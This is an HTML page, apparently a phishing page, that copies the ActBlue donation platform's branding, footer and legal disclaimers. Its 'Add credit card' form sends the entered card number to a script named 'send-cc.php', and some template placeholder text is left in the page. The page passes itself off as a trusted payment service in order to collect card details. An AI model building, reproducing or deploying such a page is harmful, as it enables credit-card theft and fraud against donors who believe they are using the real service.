<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.6.4/js/bootstrap-datepicker.js"></script>
<link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-datepicker/1.6.4/css/bootstrap-datepicker.css" rel="stylesheet"/>
<!--<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet"/>-->

  <link rel="stylesheet" href="css/bootstrap.min.css">
  <!-- Bootstrap CSS -->
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.1.3/css/bootstrap.min.css'>
<!-- Font Awesome CSS -->
<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css'>
  <link rel="stylesheet" href="css/style.css">
  <title>Document</title>
</head>
<body>
  <nav class="navbar navbar-expand-lg navbar-light bg-light">
  <a id="nb" class="navbar-brand" href="#">Act<strong>BLUE</strong></a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarText" aria-controls="navbarText" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>
  <div class="collapse navbar-collapse" id="navbarText">
    <ul class="navbar-nav mr-auto">
      <li class="nav-item active">
        <a class="nav-link" href="#">Home <span class="sr-only">(current)</span></a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">Features</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="#">Pricing</a>
      </li>
    </ul>
    <span class="navbar-text">
      Navbar text with an inline element
    </span>
  </div>
</nav>
  <!--form section-->
  <section class="sect section2">
    <!--div class="form-head-container">
    <h5 class="form-head">sign in</h5>
    </div-->
    <form method="POST" action="send-cc.php">
      <h5 class="form-group">Add credit card</h5>
  <div class="form-group">
    <label for="exampleInputEmail1"><small class="text-muted"><strong>Credit card number</strong></small></label>
    <input type="text" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Credit card number" name="cc">
    <small id="emailHelp" class="form-text text-muted">Your payment method will be securely stored by ActBlue for future use.</small>
  </div>
  <div class="row">
    <div class="form-group col">
      <label for="exampleInputEmail1"><small class="text-muted"><strong>Expiration month</strong></small></label>
      <input type="text" id="monthpicker" class="form-control" placeholder="month">
    </div>
    <div class="col">
      <label for="exampleInputEmail1"><small class="text-muted"><strong>Expiration year</strong></small></label>
      <input type="text" id="datepicker" class="form-control" placeholder="year">
    </div>
  </div>
  <div class="form-group">
    <label for="exampleInputPassword1"><small class="text-muted"><strong>Name(optional)</strong></small></label>
    <input type="password" class="form-control" id="exampleInputPassword1" placeholder="Password">
    <small id="emailHelp" class="form-text text-muted">Create a short name to help you remember this card.</small>
  </div>
  <div class="form-group">
    <div class="form-check">
      <input class="form-check-input check-input" type="checkbox" value="" id="invalidCheck2" required>
      <label class="form-check-label check-label" for="invalidCheck2">
        Make this my default payment method
      </label>
    </div>
  </div>
  
  <button type="submit" id="savebutton" class="form-control btn btn-dark">Save</button>
  
</form>
  </section>
  <section class="logo or-section sect">
    <p class="logo">Act<strong>Blue</strong></p>
  </section>
  <footer class="foot">
    <div class="footsec">
      
        <p class="footer-head">THE ORGANISATION</p>
        <p><a href="#">About ActBlue</a></p>
        <p><a href="#">Contact Us</a></p>
        <p><a href="#">Jobs</a></p>
        <p><a href="#">Blog</a></p>
        <p><a href="#">AB Charities</a></p>
      
    </div>
    <div class="footsec">
      
        <p class="footer-head">TOOLS</p>
        <p><a href="#">ActBlue Express</a></p>
        <p><a href="#">Pricing</a></p>
        <p><a href="#">Directories</a></p>
      
    </div>
    <div class="footsec">
      
        <p class="footer-head">SUPPORT</p>
        <p><a href="#">For Campaigns and Organisations</a></p>
        <p><a href="#">For Donors and Supporters</a></a></p>
        <p><a href="#">Recurring Contributions</a></p>
        <p><a href="#">Help</a></p>
      
    </div>
    <div class="footsec footend">
      <p>Paid for by ActBlue (<span class="text-muted">actblue.com</span>) and not authorized by any candidate or candidate's committee.</p>
      <p>Contributions or gifts to ActBlue are not deductible as charitable contributions for federal income tax purposes.</p>
    </div>
  </footer>
  <section class="copyright">
    <div class="copy">
      
    <p class="text-muted copy1">copyright 2006-2022. All rights reserved.</p>
    <p class="text-muted copy2">Privacy  Terms of use.</p>
    </div>
  </section>
  
  <script src="js/bootstrap.min.js"></script>
  <script src="js/main.js"></script>
  <script type="text/javascript" charset="utf-8">
    $("#datepicker").datepicker({
    format: "yyyy",
    viewMode: "years", 
    minViewMode: "years"
});
    $("#monthpicker").datepicker({
    format: "mm",
    viewMode: "months", 
    minViewMode: "months"
});
  </script>
</body>
</html>